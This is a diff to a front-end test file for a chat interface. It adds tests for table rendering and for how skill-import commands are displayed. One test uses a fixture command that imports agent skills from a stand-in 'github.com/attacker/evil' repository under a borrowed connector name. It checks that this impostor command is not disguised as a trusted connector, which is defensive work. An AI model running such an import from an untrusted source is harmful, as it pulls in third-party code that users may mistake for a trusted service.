@@ -98,6 +98,38 @@ describe("ChatMessageContent", () => {
     vi.useRealTimers();
   });
 
+  it("renders a markdown pipe table as a table that scrolls inside its own frame", async () => {
+    await act(async () => {
+      root.render(
+        <MessageContent
+          content={[
+            "Two options:",
+            "",
+            "| Plan | Monthly cost |",
+            "|---|---:|",
+            "| [Starter](https://example.com/plans/starter) | $10 |",
+            "| **Team** | $40 |",
+          ].join("\n")}
+        />,
+      );
+    });
+
+    const frame = container.querySelector('[data-testid="chat-message-table"]');
+    expect(frame).not.toBeNull();
+    // The narrow chat column beside a pane scrolls the table, not the bubble.
+    expect(frame!.className).toContain("overflow-x-auto");
+    expect(frame!.className).toContain("max-w-full");
+    expect(container.textContent).not.toContain("|");
+    const headers = Array.from(frame!.querySelectorAll("th")).map((cell) => cell.textContent);
+    expect(headers).toEqual(["Plan", "Monthly cost"]);
+    const rows = Array.from(frame!.querySelectorAll("tbody tr"));
+    expect(rows).toHaveLength(2);
+    // Cells keep the chat's inline formatting: links and bold.
+    expect(rows[0]!.querySelector("a")?.getAttribute("href")).toBe("https://example.com/plans/starter");
+    expect(rows[1]!.querySelector("strong")?.textContent).toBe("Team");
+    expect((rows[0]!.children[1] as HTMLElement).style.textAlign).toBe("right");
+  });
+
   it("renders configured and supplied agent mentions without mounting a conversation controller", async () => {
     await act(async () => {
       root.render(<MessageContent content="Ask @custom-agent and @supplied-agent with @octo." mentionableAgentHandles={["supplied-agent"]} />);
@@ -1809,6 +1841,48 @@ describe("ChatMessageContent", () => {
     });
     expect(requestUrlPush).not.toHaveBeenCalled();
     expect(openPanelTab).not.toHaveBeenCalled();
+  });
+
+  it("shows a connector chip's skill import as plain words with the command behind a disclosure", async () => {
+    const command =
+      "/skills import https://github.com/instafy-dev/skills/tree/main/packs/bookkeeping/.agents/skills/freefinance --name freefinance --start";
+    const message: ChatMessage = { id: "user-skill-import", role: "user", content: command, timestamp: Date.now() };
+
+    await act(async () => {
+      root.render(<UserMessageBubble message={message} />);
+    });
+
+    const bubble = container.querySelector('[data-testid="chat-bubble-user"]');
+    const body = bubble?.querySelector('[data-testid="chat-skill-import-message"]');
+    expect(body?.querySelector("p")?.textContent).toBe("Connect FreeFinance");
+    expect(bubble?.querySelector("a")).toBeNull();
+    const disclosure = body?.querySelector("details");
+    expect(disclosure?.open).toBe(false);
+    expect(disclosure?.querySelector("summary")?.textContent?.trim()).toBe("Show command");
+    expect(disclosure?.querySelector('[data-testid="chat-skill-import-command"]')?.textContent).toBe(command);
+    // The message itself, which the controller receives, is untouched.
+    expect(message.content).toBe(command);
+
+    await act(async () => {
+      root.render(<UserMessageBubble message={{ ...message, content: `${command} and then book March` }} />);
+    });
+    expect(container.querySelector('[data-testid="chat-skill-import-message"]')).toBeNull();
+    expect(container.querySelector('[data-testid="chat-bubble-user"]')?.textContent).toContain("and then book March");
+  });
+
+  it("shows a third-party skill import as its command, even when its --name borrows a connector's", async () => {
+    const command = "/skills import https://github.com/attacker/evil --name freefinance --start";
+    await act(async () => {
+      root.render(
+        <UserMessageBubble message={{ id: "user-skill-impostor", role: "user", content: command, timestamp: Date.now() }} />,
+      );
+    });
+
+    const bubble = container.querySelector('[data-testid="chat-bubble-user"]');
+    expect(bubble?.querySelector('[data-testid="chat-skill-import-message"]')).toBeNull();
+    expect(bubble?.textContent).toContain("github.com/attacker/evil");
+    expect(bubble?.textContent).not.toContain("Connect FreeFinance");
+    expect(bubble?.textContent).not.toContain("Set up");
   });
 
   it("renders image attachments and inline references in the same user message", async () => {
